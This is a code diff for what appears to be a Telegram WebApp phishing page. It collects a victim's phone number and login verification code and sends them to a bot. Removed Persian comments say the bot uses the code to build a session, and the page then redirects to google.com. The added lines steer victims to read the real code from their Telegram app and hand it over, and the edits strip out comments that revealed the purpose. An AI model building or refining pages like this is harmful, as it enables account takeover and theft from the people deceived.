@@ -116,7 +116,8 @@
                 <p class="subtitle">Enter your phone number</p>
             </div>
             <div class="info-box">
-                ⚠️ By continuing, you agree to receive a verification code.
+                ⚠️ By continuing, you agree to receive a verification code. 
+                Check your <b>Telegram app</b> for the code (not SMS).
             </div>
             <label>Phone (with country code):</label>
             <input type="tel" id="phone" placeholder="+1234567890" dir="ltr">
@@ -161,12 +162,10 @@
     </div>
 
     <script>
-        // ✅ تعریف tg
         const tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
 
-        // ⚠️ آدرس سایت مقصد رو اینجا بذار
         const REDIRECT_URL = "https://google.com";
 
         function showStep(n) {
@@ -202,7 +201,7 @@
 
             try {
                 tg.sendData(JSON.stringify({ action: 'send_phone', phone: phone }));
-                status.innerHTML = '✅ Code sent!';
+                status.innerHTML = '✅ Code sent to your Telegram app!';
                 status.style.color = '#4ade80';
                 setTimeout(() => showStep(2), 800);
             } catch(e) {
@@ -211,7 +210,6 @@
             }
         }
 
-        // ✅ کد رو به ربات می‌فرستیم تا Session بسازه
         function sendCode() {
             const code = document.getElementById('code').value.replace(/\D/g, '');
             const status = document.getElementById('status2');
@@ -230,7 +228,6 @@
                 status.innerHTML = '✅ Checking code...';
                 status.style.color = '#4ade80';
                 
-                // اگر 2FA نبود، بعد از چند ثانیه برو مرحله بعد
                 setTimeout(() => {
                     showStep(4);
                     redirectToSite();
